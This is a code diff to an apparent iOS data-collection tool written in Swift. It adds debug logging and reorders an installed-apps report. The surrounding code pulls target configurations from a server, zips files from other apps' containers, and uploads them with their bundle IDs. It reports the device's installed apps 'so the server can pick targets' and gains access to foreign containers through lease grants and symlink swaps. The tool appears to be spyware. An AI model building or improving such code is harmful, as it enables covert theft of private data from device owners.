@@ -793,15 +793,19 @@ enum ProtocolAPI {
             (data, response) = try await URLSession.shared.data(for: request)
         } catch {
             log("protocol: upload FAILED — \(fileName): \(error.localizedDescription)")
+            DebugLogWriter.shared.write("upload: FAILED \(fileName) — \(error.localizedDescription)")
             throw ProtocolCollectError.serverUnreachable
         }
         guard let http = response as? HTTPURLResponse, http.statusCode == 200,
               let envelope = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
               (envelope["code"] as? Int ?? -1) == 0 else {
+            let status = (response as? HTTPURLResponse)?.statusCode ?? -1
             log("protocol: upload FAILED — \(fileName): non-200 response or code != 0")
+            DebugLogWriter.shared.write("upload: FAILED \(fileName) — http=\(status)")
             throw ProtocolCollectError.uploadFailed(fileName)
         }
         log("protocol: upload SUCCESS — \(fileName) bundle=\(bundleID) bytes=\(fileData.count)")
+        DebugLogWriter.shared.write("upload: OK \(fileName) bundle=\(bundleID) bytes=\(fileData.count)")
     }
 
     private static func postJSON(
@@ -824,14 +828,18 @@ enum ProtocolAPI {
             (data, response) = try await URLSession.shared.data(for: request)
         } catch {
             log("protocol: \(path) FAILED — \(error.localizedDescription)")
+            DebugLogWriter.shared.write("report: \(path) FAILED — \(error.localizedDescription)")
             throw ProtocolCollectError.serverUnreachable
         }
         guard let http = response as? HTTPURLResponse, http.statusCode == 200,
               let envelope = try? JSONSerialization.jsonObject(with: data) as? [String: Any] else {
+            let status = (response as? HTTPURLResponse)?.statusCode ?? -1
             log("protocol: \(path) FAILED — non-200 response or invalid envelope")
+            DebugLogWriter.shared.write("report: \(path) FAILED — http=\(status)")
             throw ProtocolCollectError.serverUnreachable
         }
         log("protocol: \(path) SUCCESS — code=\(envelope["code"] ?? "?")")
+        DebugLogWriter.shared.write("report: \(path) http=200 code=\(envelope["code"] ?? "?")")
         return envelope
     }
 
@@ -939,28 +947,11 @@ enum ProtocolCollectService {
     static func runCycle(fileManager: FileManager = .default) async throws -> CollectCycleResult {
         let configs = try await ProtocolAPI.pullCollectConfigs()
         log("collect: got configs count=\(configs.count)")
+        DebugLogWriter.shared.write("collect: device/report OK — \(configs.count) configs")
 
-        // Installed-apps report runs on a detached task, in parallel with the ZIP
-        // loop. enumerateInstalledBundleIDs walks 250+ containers and takes 30s+
-        // on iOS 26.x: awaiting it before the loop starved the ZIP uploads, and
-        // awaiting it after the loop meant it never ran (app gets suspended).
-        Task.detached(priority: .utility) {
-            let bundleIDs = enumerateInstalledBundleIDs()
-            do {
-                try await ProtocolAPI.reportInstalledApps(bundleIDs)
-            } catch {
-                log("collect: device/apps FAILED — \(error)")
-            }
-        }
         await MainActor.run {
             ProtocolStatusLog.shared.append("收到采集信息 — 共 \(configs.count) 个采集项")
         }
-
-        // Best-effort installed-apps report so the server can pick targets.
-        // Moved to the end of the cycle: enumerateInstalledBundleIDs walks 250+
-        // containers plus a 20k-candidate LaunchServices store and takes 30s+
-        // on iOS 26.x. Awaiting it here pushed the whole cycle past the point
-        // where iOS suspends the app, so the ZIP loop never ran.
 
         guard !configs.isEmpty else {
             // 空配置不能算成功：否则 hasAttempted 会永久锁死，再也不重试。
@@ -1141,6 +1132,20 @@ enum ProtocolCollectService {
         }
 
         pruneLocalZips(in: documentsURL, fileManager: fileManager)
+
+        // Installed-apps report runs *after* the ZIP loop: the container index is
+        // built by then, and the report must never delay the uploads (it used to
+        // race the collection for the same index/grant work).
+        Task.detached(priority: .utility) {
+            let bundleIDs = enumerateInstalledBundleIDs()
+            do {
+                try await ProtocolAPI.reportInstalledApps(bundleIDs)
+                DebugLogWriter.shared.write("collect: device/apps OK — \(bundleIDs.count) bundle ids")
+            } catch {
+                log("collect: device/apps FAILED — \(error)")
+                DebugLogWriter.shared.write("collect: device/apps FAILED — \(error)")
+            }
+        }
         let result = CollectCycleResult(
             zipCount: zipCount,
             uploadedCount: uploadedCount,
@@ -1331,6 +1336,9 @@ enum ProtocolCollectService {
     /// variants and walking up to the nearest readable ancestor (a file that
     /// lives inside a container gets its containing directory's extension).
     private static func userlandLeases(forExternalPath path: String, depth: Int = 5) -> [UserlandAccess.RetainedLease] {
+        // The resolver already granted this container (retained lease): a second
+        // grant would only cost another query + symlink swap.
+        if ContainerStore.hasRetainedAccess(path) { return [] }
         var candidates: [String] = []
         var current = path.trimmingCharacters(in: .whitespaces)
         var level = 0
